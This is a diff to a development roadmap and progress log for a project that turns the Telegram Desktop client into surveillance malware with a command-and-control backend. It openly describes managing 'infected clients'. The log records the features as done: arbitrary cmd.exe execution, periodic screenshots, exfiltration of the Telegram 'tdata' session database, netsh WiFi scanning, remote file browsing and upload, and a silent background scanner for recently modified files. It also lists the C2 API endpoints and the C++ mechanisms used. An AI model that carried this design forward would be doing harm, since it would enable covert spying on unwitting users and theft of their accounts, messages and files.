@@ -34,16 +34,9 @@ The goal is to transform the Telegram client into a managed endpoint that collec
     - Upload collected data to the backend (COS - Cloud Object Storage).
     - **Constraint**: Low bandwidth usage, background execution.
 
-#### D. Command & Control (C2)
-- [ ] **Heartbeat**: Connect to the backend server once every hour.
-- [ ] **Tasking Engine**:
-    - Receive commands during heartbeat.
-    - **Capabilities**:
-        - Execute simple CMD commands.
-        - **Periodic Screenshot**: Set a task (e.g., "Screenshot every 1 minute") which runs locally until the next heartbeat updates the instruction.
 
 ### 1.2. Backend (Platform)
-- [ ] **Architecture**: Based on `springboot-init-master` (Java).
+- [x] **Architecture**: Based on `springboot-init-master` (Java).
 - [ ] **Storage**: Integrate with COS (Tencent Cloud Object Storage or compatible) for binary data (images, logs).
 - [ ] **Data Parsing**:
     - Backend must parse the uploaded data bundles.
@@ -52,10 +45,78 @@ The goal is to transform the Telegram client into a managed endpoint that collec
         - Contacts per Account.
         - Chat History (Text linked to Sender/Receiver).
         - Device Info (MAC, IP, Installed Software, File Lists).
+- [x] **C2 Management**:
+    - **Device List**: Track devices with persistent UUID and MAC address.
+    - **Task Management**: Issue and track commands (CMD, Screenshot, Monitor, DB Upload).
+    - **Heartbeat**: Receive and log device status (Online/Offline, Last Seen).
 - [ ] **UI/Logic**:
     - Ensure strict separation of data: Clicking a contact shows only chat history relevant to that specific contact/session.
 
 ## 2. Development Progress & Log
+
+### Phase 1: C2 Infrastructure & Basic Remote Control (Current)
+Implemented the core Command & Control infrastructure to manage infected clients.
+
+- [x] **Backend Implementation**:
+    - **API Endpoints**:
+        - `POST /api/c2/heartbeat`: Register device and update status.
+        - `POST /api/c2/tasks/pending`: Client polls for new tasks.
+        - `POST /api/c2/tasks/result`: Client uploads task execution results.
+    - **Database**: 
+        - Added `c2_device` table with UUID, MAC, IP, OS, LastSeen.
+        - Added `c2_task` table for queuing commands and storing results.
+    - **Fixes**: Resolved H2 database schema missing `uuid` and `macAddress` columns.
+- [x] **Frontend Implementation (React)**:
+    - **Device Management Page**:
+        - List all connected devices with status (Online/Offline).
+        - **Features**: Refresh button, Expandable row for task history.
+        - **UI Improvements**: Hidden internal Device ID, displayed UUID and MAC, fixed Base64 image rendering for screenshots.
+    - **Task Execution**:
+        - "Execute Command": Run arbitrary CMD commands.
+        - "Screen Screenshot": Capture immediate screen.
+        - "Start/Stop Monitor": Periodic screenshot capture (default 60s).
+        - "Upload DB": Exfiltrate local `tdata` database.
+- [x] **Client Implementation (C++)**:
+    - **Heartbeat System**:
+        - Implemented `Core::Heartbeat` class (Singleton).
+        - Sends system info (Hostname, OS, IP, MAC) every 60s.
+        - **UUID**: Generates and persists a unique device UUID to `C2Client` settings for consistent identification across restarts.
+    - **Task Processor**:
+        - Polls for tasks during heartbeat.
+        - Executes `cmd_exec` via `QProcess` (cmd.exe).
+        - Captures screenshots via `QScreen::grabWindow`.
+        - Reads and uploads local files (`upload_db`).
+    - **Stability**: Added error handling for network requests and process timeouts.
+
+### Phase 2: Advanced Reconnaissance & File Management (Current)
+Expanded capabilities to include network reconnaissance, file system surveillance, and enhanced management UI.
+
+- [x] **Backend Enhancements**:
+    - **WiFi Data**: Added storage for WiFi network scan results (SSID, BSSID, Signal).
+    - **File Management**: Implemented `POST /api/c2/upload` for client file exfiltration and `GET /api/c2/download` for admin retrieval.
+    - **Data Persistence**: Updated `C2Device` entity to store software lists and WiFi data.
+
+- [x] **Client Features (C++)**:
+    - **WiFi Scanning**: Implemented `get_wifi` command using `netsh` to capture surrounding network details.
+    - **File Operations**: 
+        - `list_dir`: Remote directory listing.
+        - `upload_file`: Multipart file upload to C2 server.
+        - `scan_recent`: Detect files modified in the last 3 days.
+    - **Background Scanner**:
+        - **Low Priority**: Runs silently in background to avoid user disruption.
+        - **Resume Capability**: Persists scan progress to `QSettings` (breakpoint resume) to handle client restarts.
+        - **Optimization**: Full scan only on first run; subsequent runs check for modifications.
+
+- [x] **Frontend Upgrade (React)**:
+    - **Device Detail View**: New comprehensive dashboard for individual devices.
+        - **Software Tab**: View installed software (refreshable).
+        - **WiFi Tab**: View surrounding WiFi networks (refreshable).
+        - **File Manager**: Browse remote files and trigger uploads to server.
+        - **Recent Files**: Scan and exfiltrate recently modified files.
+        - **Downloads**: Direct download links for exfiltrated files.
+        - **Pagination & State Management**: Fixed pagination issues across all tabs; implemented independent component state to persist view settings (e.g., page size) during auto-refresh.
+        - **Auto-Refresh Control**: Added a global toggle switch to enable/disable real-time data polling.
+    - **UI/UX**: Added progress tracking (task status) and intuitive navigation.
 
 ### Phase 0: Environment & Build System Fixes (Completed)
 Before implementing features, the build environment was stabilized to ensure successful compilation of the original Telegram Desktop.
